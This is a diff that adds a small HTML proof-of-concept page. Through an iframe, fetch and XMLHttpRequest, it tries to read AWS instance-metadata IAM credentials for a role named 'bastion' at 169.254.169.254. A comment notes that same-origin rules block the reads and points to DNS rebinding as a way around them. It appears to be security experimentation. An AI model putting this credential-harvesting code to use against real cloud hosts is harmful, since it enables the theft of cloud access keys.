@@ -1,0 +1,53 @@
+<!-- http://www.brucelawson.co.uk/2010/a-minimal-html5-document/ -->
+
+<!doctype html>
+<html lang=en>
+<head>
+<meta charset=utf-8>
+<title>blah</title>
+</head>
+<body>
+<p>I'm the content</p>
+<iframe id="frame" src="http://169.254.169.254/latest/meta-data/iam/security-credentials/bastion"></iframe>
+  <script>
+console.log("weewaa!");
+fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/bastion").then(function(response) {
+    response.text().then(function(text) {
+    console.log(text);
+  });
+});
+   var ifrm = document.getElementById('frame'); 
+   var doc = ifrm.contentDocument? ifrm.contentDocument: ifrm.contentWindow.document;
+   console.log(ifrm.contentDocument)
+   console.log(doc);
+
+/* note that get_information and fetch() both fail due to same origin policy and there's no CORS header on 169...
+Firefox error: Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://169.254.169.254/latest/meta-data/iam/security-credentials/bastion. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing).[Learn More] 
+
+However the DNS rebinding attacks just that; but still difficult to do since most browser pin a DNS name once a site is loaded */
+*/
+
+function get_information(link, callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", link, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            callback(xhr.responseText);
+        }
+    };
+    xhr.send(null);
+}
+
+get_information("http://169.254.169.254/latest/meta-data/iam/security-credentials/bastion", function(text) {
+    var div = document.createElement("div");
+    div.innerHTML = text;
+    // Do something with the div here, like inserting it into the page
+console.log("the data is");
+console.log(text);
+});
+  </script>
+<p>
+iframe below
+</p>
+</body>
+</html>
